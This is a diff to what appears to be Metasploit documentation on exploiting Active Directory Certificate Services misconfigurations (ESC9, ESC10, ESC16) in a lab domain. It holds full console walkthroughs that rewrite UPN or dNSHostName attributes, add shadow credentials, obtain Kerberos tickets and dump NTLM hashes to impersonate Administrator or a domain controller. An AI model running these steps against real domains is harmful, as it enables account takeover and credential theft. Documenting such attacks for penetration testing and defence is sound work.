@@ -1035,9 +1035,8 @@ connect however it defaults to 389.
 
 The option `UPDATE_LDAP_OBJECT` is an enum that can be set to either `userPrincipalName`  or `dNSHostName` and must be
 set in order to instruct the module to attempt to exploit ESC9 or ESC10. We will set `UPDATE_LDAP_OBJECT` to
-`userPrincipalName` in this case and so we then must set `ALT_UPN` to `Administrator@kerberos.issue`.
+`userPrincipalName` in this case and so we then must set `UPDATE_LDAP_OBJECT_VALUE` to `Administrator`.
 
-The module parses the value of `ALT_UPN` or `ALT_DNS` in order to update either attribute `userPrincipalName` or `dNSHostName` attribute.
 It's important for this scenario, when updating the UPN to omit the domain suffix from the UPN to avoid conflicts with
 other UPNs in the domain, which by default all contain the suffix. The UPN processing order will still allow the DC to
 map the UPN Administrator in our writable account to the actual administrator, making its impersonation possible.
@@ -1051,79 +1050,68 @@ In the following example, the ESC9-Template template is vulnerable to ESC9 and w
 ```
 msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set rhosts 172.16.199.200
 rhosts => 172.16.199.200
-msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set CA kerberos-DC2-CA
-CA => kerberos-DC2-CA
-msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set CERT_TEMPLATE ESC9-Template
-CERT_TEMPLATE => ESC9-Template
-msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set smbuser user1
-smbuser => user1
-msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set smbpass N0tpassword!
-smbpass => N0tpassword!
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set ldaprport 389
+ldaprport => 389
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set target_username user2
+target_username => user2
 msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set smbdomain kerberos.issue
 smbdomain => kerberos.issue
-msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set target_username "user2"
-target_username => user2
-msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set UPDATE_LDAP_OBJECT userPrincipalName
-UPDATE_LDAP_OBJECT => userPrincipalName
-msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set alt_upn Administrator@kerberos.issue
-alt_upn => Administrator@kerberos.issue
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set smbpass N0tpassword!
+smbpass => N0tpassword!
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set smbuser user1
+smbuser => user1
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set cert_template ESC9-Template
+cert_template => SpencerTest
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set ca kerberos-DC2-CA
+ca => kerberos-DC2-CA
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set UPDATE_LDAP_OBJECT_VALUE Administrator
+UPDATE_LDAP_OBJECT_VALUE => Administrator
 msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > run
 [*] Running module against 172.16.199.200
-[*] 172.16.199.200:445 - Loading auxiliary/gather/ldap_object_attribute
-[*] 172.16.199.200:445 - Running auxiliary/gather/ldap_object_attribute
+[*] 172.16.199.200:445 - Loading auxiliary/admin/ldap/ldap_object_attribute
+[*] 172.16.199.200:445 - Running auxiliary/admin/ldap/ldap_object_attribute
 [*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
-[*] Current value of user2's userPrincipalName: Administrator
+[*] Current value of user2's userPrincipalName: user2
 [*] Attempting to update userPrincipalName for CN=user2,CN=Users,DC=kerberos,DC=issue to Administrator...
 [+] Successfully updated CN=user2,CN=Users,DC=kerberos,DC=issue's userPrincipalName to Administrator
 [+] The operation completed successfully!
+[*] 172.16.199.200:445 - Adding shadow credentials for user2
+[*] 172.16.199.200:445 - Loading admin/ldap/shadow_credentials
+[*] 172.16.199.200:445 - Running admin/ldap/shadow_credentials
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Discovering base DN automatically
+[*] 172.16.199.200:389 Discovered base DN: DC=kerberos,DC=issue
+[*] Certificate stored at: /Users/jheysel/.msf4/loot/20250717140905_default_172.16.199.200_windows.ad.cs_563081.pfx
+[+] Successfully updated the msDS-KeyCredentialLink attribute; certificate with device ID 2ff08c15-0ab3-98ad-ee0b-3fd1fbcf3e9d
+[*] 172.16.199.200:445 - Loading admin/kerberos/get_ticket
+[*] 172.16.199.200:445 - Getting hash for user2
+[!] Warning: Provided principal and realm (user2@kerberos.issue) do not match entries in certificate:
+[+] 172.16.199.200:88 - Received a valid TGT-Response
+[*] 172.16.199.200:88 - TGT MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250717140905_default_172.16.199.200_mit.kerberos.cca_263627.bin
+[*] 172.16.199.200:88 - Getting NTLM hash for user2@kerberos.issue
+[+] 172.16.199.200:88 - Received a valid TGS-Response
+[*] 172.16.199.200:88 - TGS MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250717140905_default_172.16.199.200_mit.kerberos.cca_015140.bin
+[+] Found NTLM hash for user2: aad3b435b51404eeaad3b435b51404ee:4fd408d8f8ecb20d4b0768a0ac44b71f
 [+] 172.16.199.200:445 - The requested certificate was issued.
 [*] 172.16.199.200:445 - Certificate Policies:
 [*] 172.16.199.200:445 -   * 1.3.6.1.5.5.7.3.2 (Client Authentication)
-[*] 172.16.199.200:445 - Certificate UPN: Administrator@kerberos.issue
-[*] 172.16.199.200:445 - Certificate stored at: /Users/jheysel/.msf4/loot/20250602105447_default_172.16.199.200_windows.ad.cs_197715.pfx
-[*] 172.16.199.200:445 - Loading auxiliary/gather/ldap_object_attribute
-[*] 172.16.199.200:445 - Running auxiliary/gather/ldap_object_attribute
+[*] 172.16.199.200:445 - Certificate UPN: Administrator
+[*] 172.16.199.200:445 - Certificate stored at: /Users/jheysel/.msf4/loot/20250717140907_default_172.16.199.200_windows.ad.cs_548728.pfx
+[*] 172.16.199.200:445 - reverting ldap object
+[*] 172.16.199.200:445 - Loading admin/ldap/shadow_credentials
+[*] 172.16.199.200:445 - Running admin/ldap/shadow_credentials
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Discovering base DN automatically
+[*] 172.16.199.200:389 Discovered base DN: DC=kerberos,DC=issue
+[*] No matching entries found - check device ID
+[*] 172.16.199.200:445 - Loading auxiliary/admin/ldap/ldap_object_attribute
+[*] 172.16.199.200:445 - Running auxiliary/admin/ldap/ldap_object_attribute
 [*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
 [*] Current value of user2's userPrincipalName: Administrator
-[*] Attempting to update userPrincipalName for CN=user2,CN=Users,DC=kerberos,DC=issue to Administrator...
-[+] Successfully updated CN=user2,CN=Users,DC=kerberos,DC=issue's userPrincipalName to Administrator
+[*] Attempting to update userPrincipalName for CN=user2,CN=Users,DC=kerberos,DC=issue to user2...
+[+] Successfully updated CN=user2,CN=Users,DC=kerberos,DC=issue's userPrincipalName to user2
 [+] The operation completed successfully!
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > use ldap_login
-
-Matching Modules
-================
-
-   #  Name                               Disclosure Date  Rank    Check  Description
-   -  ----                               ---------------  ----    -----  -----------
-   0  auxiliary/scanner/ldap/ldap_login  .                normal  No     LDAP Login Scanner
-
-
-Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/ldap/ldap_login
-
-[*] Using auxiliary/scanner/ldap/ldap_login
-[*] The CreateSession option within this module can open an interactive session
-msf6 auxiliary(scanner/ldap/ldap_login) > set rhost 172.16.199.200
-rhost => 172.16.199.200
-msf6 auxiliary(scanner/ldap/ldap_login) > set LDAP::Auth schannel
-LDAP::Auth => schannel
-msf6 auxiliary(scanner/ldap/ldap_login) > set LDAP::CertFile /Users/jheysel/.msf4/loot/20250602105447_default_172.16.199.200_windows.ad.cs_197715.pfx
-LDAP::CertFile => /Users/jheysel/.msf4/loot/20250602105447_default_172.16.199.200_windows.ad.cs_197715.pfx
-msf6 auxiliary(scanner/ldap/ldap_login) > set SSL true
-[!] Changing the SSL option's value may require changing RPORT!
-SSL => true
-msf6 auxiliary(scanner/ldap/ldap_login) > run
-[+] Success: 'Cert File /Users/jheysel/.msf4/loot/20250602105447_default_172.16.199.200_windows.ad.cs_197715.pfx'
-[*] LDAP session 1 opened (172.16.199.1:63612 -> 172.16.199.200:389) at 2025-06-02 10:55:58 -0700
-[*] Scanned 1 of 1 hosts (100% complete)
-[*] Bruteforce completed, 1 credential was successful.
-[*] 1 LDAP session was opened successfully.
-[*] Auxiliary module execution completed
-msf6 auxiliary(scanner/ldap/ldap_login) > sessions -i -1
-[*] Starting interaction with 1...
-
-LDAP (172.16.199.200) > getuid
-[*] Server username: KERBEROS\Administrator
 ```
 We can then use the `kerberos/get_ticket` module to gain a Kerberos ticket granting ticket (TGT) as the `Administrator`
 domain administrator. See the [Getting A Kerberos Ticket](#getting-a-kerberos-ticket) section for more information.
@@ -1145,69 +1133,81 @@ We will be changing the `dNSHostName` of the machine account `Test1$` to `DC2.ke
 
 
 ```
-msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > unset alt_upn
-Unsetting alt_upn...
 msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set rhosts 172.16.199.200
 rhosts => 172.16.199.200
 msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set ldaprport 389
 ldaprport => 389
 msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set target_username "Test2$"
 target_username => Test2$
-msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set alt_dns dc2.kerberos.issue
-alt_dns => dc2.kerberos.issue
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set UPDATE_LDAP_OBJECT_VALUE dc2.kerberos.issue
+UPDATE_LDAP_OBJECT_VALUE => dc2.kerberos.issue
 msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set UPDATE_LDAP_OBJECT dnsHostName
 UPDATE_LDAP_OBJECT => dNSHostName
 msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set CA kerberos-DC2-CA
 CA => kerberos-DC2-CA
-msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set smbuser "Test1$"
-smbuser => Test1$
-msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set smbpass N0tpassword!
-smbpass => N0tpassword!
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set CERT_TEMPLATE ESC9-Template-Dns
+CERT_TEMPLATE => ESC9-Template-Dns
 msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set smbdomain kerberos.issue
 smbdomain => kerberos.issue
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set smbpass N0tpassword!
+smbpass => N0tpassword!
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set smbuser Test1$
+smbuser => Test1$
 msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > run
-[*] Running module against 172.16.199.200
-[*] 172.16.199.200:445 - Loading auxiliary/gather/ldap_object_attribute
-[*] 172.16.199.200:445 - Running auxiliary/gather/ldap_object_attribute
+[*] Reloading module...
 [*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
-[*] Attempting to delete attribute dNSHostName from CN=Test2,CN=Computers,DC=kerberos,DC=issue...
-[+] Successfully deleted attribute dNSHostName from CN=Test2,CN=Computers,DC=kerberos,DC=issue
-[+] The operation completed successfully!
-[-] 172.16.199.200:445 - Auxiliary aborted due to failure: bad-config: The ALT_UPN should not be set if UPDATE_LDAP_OBJECT is set to dNSHostName.
-[*] Auxiliary module execution completed
-msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > unset alt_upn
-Unsetting alt_upn...
-msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > run
 [*] Running module against 172.16.199.200
-[*] 172.16.199.200:445 - Loading auxiliary/gather/ldap_object_attribute
-[*] 172.16.199.200:445 - Running auxiliary/gather/ldap_object_attribute
+[*] 172.16.199.200:445 - Loading auxiliary/admin/ldap/ldap_object_attribute
+[*] 172.16.199.200:445 - Running auxiliary/admin/ldap/ldap_object_attribute
 [*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
 [*] Current value of Test2$'s dNSHostName:
 [*] Attempting to update dNSHostName for CN=Test2,CN=Computers,DC=kerberos,DC=issue to dc2.kerberos.issue...
 [+] Successfully updated CN=Test2,CN=Computers,DC=kerberos,DC=issue's dNSHostName to dc2.kerberos.issue
 [+] The operation completed successfully!
+[*] 172.16.199.200:445 - Adding shadow credentials for Test2$
+[*] 172.16.199.200:445 - Loading admin/ldap/shadow_credentials
+[*] 172.16.199.200:445 - Running admin/ldap/shadow_credentials
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Discovering base DN automatically
+[*] 172.16.199.200:389 Discovered base DN: DC=kerberos,DC=issue
+[*] Certificate stored at: /Users/jheysel/.msf4/loot/20250717141705_default_172.16.199.200_windows.ad.cs_907188.pfx
+[+] Successfully updated the msDS-KeyCredentialLink attribute; certificate with device ID 517757a2-5174-5c43-6005-102c4429ff05
+[*] 172.16.199.200:445 - Loading admin/kerberos/get_ticket
+[*] 172.16.199.200:445 - Getting hash for user2
+[!] Warning: Provided principal and realm (Test2$@kerberos.issue) do not match entries in certificate:
+[+] 172.16.199.200:88 - Received a valid TGT-Response
+[*] 172.16.199.200:88 - TGT MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250717141705_default_172.16.199.200_mit.kerberos.cca_132784.bin
+[*] 172.16.199.200:88 - Getting NTLM hash for Test2$@kerberos.issue
+[+] 172.16.199.200:88 - Received a valid TGS-Response
+[*] 172.16.199.200:88 - TGS MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250717141705_default_172.16.199.200_mit.kerberos.cca_364943.bin
+[+] Found NTLM hash for Test2$: aad3b435b51404eeaad3b435b51404ee:4fd408d8f8ecb20d4b0768a0ac44b71f
 [+] 172.16.199.200:445 - The requested certificate was issued.
 [*] 172.16.199.200:445 - Certificate Policies:
 [*] 172.16.199.200:445 -   * 1.3.6.1.5.5.7.3.2 (Client Authentication)
 [*] 172.16.199.200:445 - Certificate DNS: dc2.kerberos.issue
-[*] 172.16.199.200:445 - Certificate stored at: /Users/jheysel/.msf4/loot/20250602110830_default_172.16.199.200_windows.ad.cs_006601.pfx
-[*] 172.16.199.200:445 - Loading auxiliary/gather/ldap_object_attribute
-[*] 172.16.199.200:445 - Running auxiliary/gather/ldap_object_attribute
+[*] 172.16.199.200:445 - Certificate stored at: /Users/jheysel/.msf4/loot/20250717141706_default_172.16.199.200_windows.ad.cs_369517.pfx
+[*] 172.16.199.200:445 - reverting ldap object
+[*] 172.16.199.200:445 - Loading admin/ldap/shadow_credentials
+[*] 172.16.199.200:445 - Running admin/ldap/shadow_credentials
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Discovering base DN automatically
+[*] 172.16.199.200:389 Discovered base DN: DC=kerberos,DC=issue
+[+] Deleted entry with device ID 517757a2-5174-5c43-6005-102c4429ff05
+[*] 172.16.199.200:445 - Loading auxiliary/admin/ldap/ldap_object_attribute
+[*] 172.16.199.200:445 - Running auxiliary/admin/ldap/ldap_object_attribute
 [*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
 [*] Attempting to delete attribute dNSHostName from CN=Test2,CN=Computers,DC=kerberos,DC=issue...
 [+] Successfully deleted attribute dNSHostName from CN=Test2,CN=Computers,DC=kerberos,DC=issue
 [+] The operation completed successfully!
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > use admin/kerberos/get_ticket
-[*] Using action GET_TGT - view all 3 actions with the show actions command
-msf6 auxiliary(admin/kerberos/get_ticket) > get_hash rhosts=172.16.199.200 cert_file=/Users/jheysel/.msf4/loot/20250602110830_default_172.16.199.200_windows.ad.cs_006601.pfx
+msf6 auxiliary(admin/kerberos/get_ticket) > get_hash rhosts=172.16.199.200 cert_file=/Users/jheysel/.msf4/loot/20250717141706_default_172.16.199.200_windows.ad.cs_369517.pfx
 [*] Running module against 172.16.199.200
 [+] 172.16.199.200:88 - Received a valid TGT-Response
-[*] 172.16.199.200:88 - TGT MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250602110910_default_172.16.199.200_mit.kerberos.cca_378767.bin
+[*] 172.16.199.200:88 - TGT MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250717142328_default_172.16.199.200_mit.kerberos.cca_370847.bin
 [*] 172.16.199.200:88 - Getting NTLM hash for dc2$@kerberos.issue
 [+] 172.16.199.200:88 - Received a valid TGS-Response
-[*] 172.16.199.200:88 - TGS MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250602110910_default_172.16.199.200_mit.kerberos.cca_467439.bin
-[+] Found NTLM hash for dc2$: aad3b435b51404eeaad3b435b51404ee:e94f9c213b133b15a194099bc361cc58
+[*] 172.16.199.200:88 - TGS MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250717142328_default_172.16.199.200_mit.kerberos.cca_596103.bin
+[+] Found NTLM hash for dc2$: aad3b435b51404eeaad3b435b51404ee:cceede79c156a295f45e7ad38ee2f884
 [*] Auxiliary module execution completed
 ```
 
@@ -1235,8 +1235,8 @@ msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set ldaprport 389
 ldaprport => 389
 msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set target_username "user2"
 target_username => user2
-msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set alt_upn 'DC2$@kerberos.issue'
-alt_upn => DC2$@kerberos.issue
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set UPDATE_LDAP_OBJECT_VALUE 'DC2$@kerberos.issue'
+UPDATE_LDAP_OBJECT_VALUE => DC2$@kerberos.issue
 msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set UPDATE_LDAP_OBJECT userPrincipalName
 UPDATE_LDAP_OBJECT => userPrincipalName
 msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set CA kerberos-DC2-CA
@@ -1251,25 +1251,50 @@ msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set smbuser user1
 smbuser => user1
 msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > run
 [*] Running module against 172.16.199.200
-[*] 172.16.199.200:445 - Loading auxiliary/gather/ldap_object_attribute
-[*] 172.16.199.200:445 - Running auxiliary/gather/ldap_object_attribute
+[*] 172.16.199.200:445 - Loading auxiliary/admin/ldap/ldap_object_attribute
+[*] 172.16.199.200:445 - Running auxiliary/admin/ldap/ldap_object_attribute
 [*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
-[*] Current value of user2's userPrincipalName:
-[*] Attempting to update userPrincipalName for CN=user2,CN=Users,DC=kerberos,DC=issue to DC2$...
-[+] Successfully updated CN=user2,CN=Users,DC=kerberos,DC=issue's userPrincipalName to DC2$
+[*] Current value of user2's userPrincipalName: user2
+[*] Attempting to update userPrincipalName for CN=user2,CN=Users,DC=kerberos,DC=issue to DC2$@kerberos.issue...
+[+] Successfully updated CN=user2,CN=Users,DC=kerberos,DC=issue's userPrincipalName to DC2$@kerberos.issue
 [+] The operation completed successfully!
+[*] 172.16.199.200:445 - Adding shadow credentials for user2
+[*] 172.16.199.200:445 - Loading admin/ldap/shadow_credentials
+[*] 172.16.199.200:445 - Running admin/ldap/shadow_credentials
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Discovering base DN automatically
+[*] 172.16.199.200:389 Discovered base DN: DC=kerberos,DC=issue
+[*] Certificate stored at: /Users/jheysel/.msf4/loot/20250717143323_default_172.16.199.200_windows.ad.cs_860225.pfx
+[+] Successfully updated the msDS-KeyCredentialLink attribute; certificate with device ID 825a1a2f-336f-e41c-24fb-703bb79f79f9
+[*] 172.16.199.200:445 - Loading admin/kerberos/get_ticket
+[*] 172.16.199.200:445 - Getting hash for user2
+[!] Warning: Provided principal and realm (user2@kerberos.issue) do not match entries in certificate:
+[+] 172.16.199.200:88 - Received a valid TGT-Response
+[*] 172.16.199.200:88 - TGT MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250717143323_default_172.16.199.200_mit.kerberos.cca_872380.bin
+[*] 172.16.199.200:88 - Getting NTLM hash for user2@kerberos.issue
+[+] 172.16.199.200:88 - Received a valid TGS-Response
+[*] 172.16.199.200:88 - TGS MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250717143323_default_172.16.199.200_mit.kerberos.cca_123025.bin
+[+] Found NTLM hash for user2: aad3b435b51404eeaad3b435b51404ee:4fd408d8f8ecb20d4b0768a0ac44b71f
 [+] 172.16.199.200:445 - The requested certificate was issued.
 [*] 172.16.199.200:445 - Certificate Policies:
 [*] 172.16.199.200:445 -   * 1.3.6.1.5.5.7.3.2 (Client Authentication)
 [*] 172.16.199.200:445 -   * 1.3.6.1.5.5.7.3.1 (Server Authentication)
 [*] 172.16.199.200:445 -   * 1.3.6.1.4.1.311.20.2.2 (Smart Card Logon)
 [*] 172.16.199.200:445 - Certificate UPN: DC2$@kerberos.issue
-[*] 172.16.199.200:445 - Certificate stored at: /Users/jheysel/.msf4/loot/20250602111206_default_172.16.199.200_windows.ad.cs_548486.pfx
-[*] 172.16.199.200:445 - Loading auxiliary/gather/ldap_object_attribute
-[*] 172.16.199.200:445 - Running auxiliary/gather/ldap_object_attribute
+[*] 172.16.199.200:445 - Certificate stored at: /Users/jheysel/.msf4/loot/20250717143324_default_172.16.199.200_windows.ad.cs_752634.pfx
+[*] 172.16.199.200:445 - reverting ldap object
+[*] 172.16.199.200:445 - Loading admin/ldap/shadow_credentials
+[*] 172.16.199.200:445 - Running admin/ldap/shadow_credentials
 [*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
-[*] Attempting to delete attribute userPrincipalName from CN=user2,CN=Users,DC=kerberos,DC=issue...
-[+] Successfully deleted attribute userPrincipalName from CN=user2,CN=Users,DC=kerberos,DC=issue
+[*] Discovering base DN automatically
+[*] 172.16.199.200:389 Discovered base DN: DC=kerberos,DC=issue
+[+] Deleted entry with device ID 825a1a2f-336f-e41c-24fb-703bb79f79f9
+[*] 172.16.199.200:445 - Loading auxiliary/admin/ldap/ldap_object_attribute
+[*] 172.16.199.200:445 - Running auxiliary/admin/ldap/ldap_object_attribute
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Current value of user2's userPrincipalName: DC2$@kerberos.issue
+[*] Attempting to update userPrincipalName for CN=user2,CN=Users,DC=kerberos,DC=issue to user2...
+[+] Successfully updated CN=user2,CN=Users,DC=kerberos,DC=issue's userPrincipalName to user2
 [+] The operation completed successfully!
 [*] Auxiliary module execution completed
 
@@ -1277,18 +1302,22 @@ msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > use ldap_login
 [*] Using auxiliary/scanner/ldap/ldap_login
 [*] The CreateSession option within this module can open an interactive session
 
-msf6 auxiliary(scanner/ldap/ldap_login) > run rhosts=172.16.199.200 LDAP::Auth=schannel LDAP::CertFile=/Users/jheysel/.msf4/loot/20250602111206_default_172.16.199.200_windows.ad.cs_548486.pfx
-[+] Success: 'Cert File /Users/jheysel/.msf4/loot/20250602111206_default_172.16.199.200_windows.ad.cs_548486.pfx'
-[*] LDAP session 2 opened (172.16.199.1:63765 -> 172.16.199.200:389) at 2025-06-02 11:14:12 -0700
+msf6 auxiliary(scanner/ldap/ldap_login) > run ssl=true rhosts=172.16.199.200 LDAP::Auth=schannel LDAP::CertFile=/Users/jheysel/.msf4/loot/20250717143324_default_172.16.199.200_windows.ad.cs_752634.pfx
+[+] Success: 'Cert File /Users/jheysel/.msf4/loot/20250717143324_default_172.16.199.200_windows.ad.cs_752634.pfx'
+[*] LDAP session 1 opened (172.16.199.1:58674 -> 172.16.199.200:389) at 2025-07-17 14:35:08 -0700
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Bruteforce completed, 1 credential was successful.
 [*] 1 LDAP session was opened successfully.
 [*] Auxiliary module execution completed
-msf6 auxiliary(scanner/ldap/ldap_login) > sessions -i -1
-[*] Starting interaction with 2...
+msf6 auxiliary(scanner/ldap/ldap_login) > sessions -l
 
-LDAP (172.16.199.200) > getuid
-[*] Server username: KERBEROS\DC2$
+Active sessions
+===============
+
+  Id  Name  Type  Information                     Connection
+  --  ----  ----  -----------                     ----------
+  1         ldap  LDAP DC2$ @ 172.16.199.200:389  172.16.199.1:58674 -> 172.16.199.200:389 (172.16.199.200)
+
 ```
 
 
@@ -1484,44 +1513,71 @@ msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set smbpass N0tpassword!
 smbpass => N0tpassword!
 msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set smbuser user1
 smbuser => user1
-msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set alt_upn Administrator@kerberos.issue
-alt_upn => Administrator@kerberos.issue
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set UPDATE_LDAP_OBJECT_VALUE Administrator
+UPDATE_LDAP_OBJECT_VALUE => Administrator
 msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set ca kerberos-dc2-ca
 ca => kerberos-dc2-ca
 msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set cert_template ESC16-Template
 cert_template => ESC16-Template
 msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > run
 [*] Running module against 172.16.199.200
-[*] 172.16.199.200:445 - Loading auxiliary/gather/ldap_object_attribute
-[*] 172.16.199.200:445 - Running auxiliary/gather/ldap_object_attribute
+[*] 172.16.199.200:445 - Loading auxiliary/admin/ldap/ldap_object_attribute
+[*] 172.16.199.200:445 - Running auxiliary/admin/ldap/ldap_object_attribute
 [*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
-[*] Current value of user2's userPrincipalName:
+[*] Current value of user2's userPrincipalName: user2
 [*] Attempting to update userPrincipalName for CN=user2,CN=Users,DC=kerberos,DC=issue to Administrator...
 [+] Successfully updated CN=user2,CN=Users,DC=kerberos,DC=issue's userPrincipalName to Administrator
 [+] The operation completed successfully!
+[*] 172.16.199.200:445 - Adding shadow credentials for user2
+[*] 172.16.199.200:445 - Loading admin/ldap/shadow_credentials
+[*] 172.16.199.200:445 - Running admin/ldap/shadow_credentials
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Discovering base DN automatically
+[*] 172.16.199.200:389 Discovered base DN: DC=kerberos,DC=issue
+[*] Certificate stored at: /Users/jheysel/.msf4/loot/20250717152132_default_172.16.199.200_windows.ad.cs_473934.pfx
+[+] Successfully updated the msDS-KeyCredentialLink attribute; certificate with device ID 0d055983-7921-797a-529e-259b4b7542a2
+[*] 172.16.199.200:445 - Loading admin/kerberos/get_ticket
+[*] 172.16.199.200:445 - Getting hash for user2
+[!] Warning: Provided principal and realm (user2@kerberos.issue) do not match entries in certificate:
+[+] 172.16.199.200:88 - Received a valid TGT-Response
+[*] 172.16.199.200:88 - TGT MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250717152132_default_172.16.199.200_mit.kerberos.cca_930617.bin
+[*] 172.16.199.200:88 - Getting NTLM hash for user2@kerberos.issue
+[+] 172.16.199.200:88 - Received a valid TGS-Response
+[*] 172.16.199.200:88 - TGS MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250717152132_default_172.16.199.200_mit.kerberos.cca_355422.bin
+[+] Found NTLM hash for user2: aad3b435b51404eeaad3b435b51404ee:4fd408d8f8ecb20d4b0768a0ac44b71f
 [+] 172.16.199.200:445 - The requested certificate was issued.
 [*] 172.16.199.200:445 - Certificate Policies:
 [*] 172.16.199.200:445 -   * 1.3.6.1.5.5.7.3.2 (Client Authentication)
-[*] 172.16.199.200:445 - Certificate UPN: Administrator@kerberos.issue
-[*] 172.16.199.200:445 - Certificate stored at: /Users/jheysel/.msf4/loot/20250603131001_default_172.16.199.200_windows.ad.cs_555632.pfx
-[*] 172.16.199.200:445 - Loading auxiliary/gather/ldap_object_attribute
-[*] 172.16.199.200:445 - Running auxiliary/gather/ldap_object_attribute
+[*] 172.16.199.200:445 - Certificate UPN: Administrator
+[*] 172.16.199.200:445 - Certificate stored at: /Users/jheysel/.msf4/loot/20250717152134_default_172.16.199.200_windows.ad.cs_383174.pfx
+[*] 172.16.199.200:445 - reverting ldap object
+[*] 172.16.199.200:445 - Loading admin/ldap/shadow_credentials
+[*] 172.16.199.200:445 - Running admin/ldap/shadow_credentials
 [*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
-[*] Attempting to delete attribute userPrincipalName from CN=user2,CN=Users,DC=kerberos,DC=issue...
-[+] Successfully deleted attribute userPrincipalName from CN=user2,CN=Users,DC=kerberos,DC=issue
+[*] Discovering base DN automatically
+[*] 172.16.199.200:389 Discovered base DN: DC=kerberos,DC=issue
+[+] Deleted entry with device ID 0d055983-7921-797a-529e-259b4b7542a2
+[*] 172.16.199.200:445 - Loading auxiliary/admin/ldap/ldap_object_attribute
+[*] 172.16.199.200:445 - Running auxiliary/admin/ldap/ldap_object_attribute
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Current value of user2's userPrincipalName: Administrator
+[*] Attempting to update userPrincipalName for CN=user2,CN=Users,DC=kerberos,DC=issue to user2...
+[+] Successfully updated CN=user2,CN=Users,DC=kerberos,DC=issue's userPrincipalName to user2
 [+] The operation completed successfully!
 [*] Auxiliary module execution completed
 ```
 
 With the certificate issued, the attacker can then use the `kerberos/get_ticket` module to obtain the hash of the admin user:
 ```
-msf6 auxiliary(admin/kerberos/get_ticket) > get_hash rhosts=172.16.199.200 cert_file=/Users/jheysel/.msf4/loot/20250603131001_default_172.16.199.200_windows.ad.cs_555632.pfx
